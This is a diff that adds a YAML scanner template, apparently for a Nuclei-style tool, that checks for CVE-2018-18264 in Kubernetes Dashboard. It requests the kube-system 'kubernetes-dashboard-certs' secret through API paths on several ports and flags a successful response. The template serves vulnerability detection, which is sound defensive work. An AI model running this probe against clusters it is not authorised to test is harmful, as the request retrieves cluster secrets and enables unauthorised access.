@@ -1,0 +1,27 @@
+id: kubernetes-dashboard-bypass
+info:
+  name: kubernetes-dashboard-bypass - CVE-2018-18264
+  risk: High
+
+params:
+  - root: '{{.BaseURL}}'
+
+replicate:
+  ports: '6443,8080,10250,10251'
+
+variables:
+  - endpoints: |
+      /api/v1/
+      /k8s/api/v1/
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+     {{.root}}{{.endpoints}}namespaces/kube-system/secrets/kubernetes-dashboard-certs
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("response", "apiVersion") && StringSearch("response", "objectRef")
+
+references:
+  - link: https://sysdig.com/blog/privilege-escalation-kubernetes-dashboard/
